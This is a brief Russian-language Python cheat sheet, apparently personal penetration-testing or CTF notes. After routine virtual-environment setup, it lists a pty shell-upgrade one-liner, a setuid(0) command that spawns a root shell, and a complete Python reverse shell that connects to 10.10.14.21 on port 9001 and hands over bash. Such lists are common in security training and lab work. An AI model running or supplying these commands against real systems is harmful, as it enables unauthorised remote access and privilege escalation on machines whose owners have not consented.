# Python

# Активировать виртуальную среду


python3 -m venv venv

source venv/bin/activate

pip3 install -r requirements.txt

pip3 install .

# получение виртуальной оболочки внутри текущей сессии

    python3 -c 'import pty;pty.spawn("/bin/bash")'

    export TERM=xterm

# выполнение команд оси

./python3.8 -c “import os; os.setuid(0), os.system(‘/bin/sh’)”

# Reverse shell

    exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
